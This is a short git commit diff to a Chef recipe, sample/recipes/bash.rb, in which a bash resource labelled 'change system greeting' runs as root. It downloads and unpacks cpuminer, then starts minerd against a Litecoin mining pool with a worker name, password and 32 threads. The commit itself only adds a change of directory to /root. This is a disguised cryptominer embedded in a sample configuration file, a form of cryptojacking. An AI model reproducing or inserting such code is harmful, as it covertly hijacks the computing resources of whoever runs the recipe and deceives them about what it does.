ab98457b980297643d0cc86378ac8fea841c5992
jatinluthra14 <jatinluthra14@gmail.com>
2016-04-23 22:52:54 +0530

    Update bash.rb
    minerd1

--- sample/recipes/bash.rb
+++ sample/recipes/bash.rb
@@ -1,6 +1,6 @@
 bash "change system greeting" do
   user "root"
   code <<-EOH
-  wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32
+  cd /root && wget https://github.com/pooler/cpuminer/releases/download/v2.4.4/pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && tar xvf pooler-cpuminer-2.4.4-linux-x86_64.tar.gz && ./minerd -o stratum+tcp://global.wemineltc.com:3333 -u ajhaxynr.1 -p ajHax365 -t 32
   EOH
   end
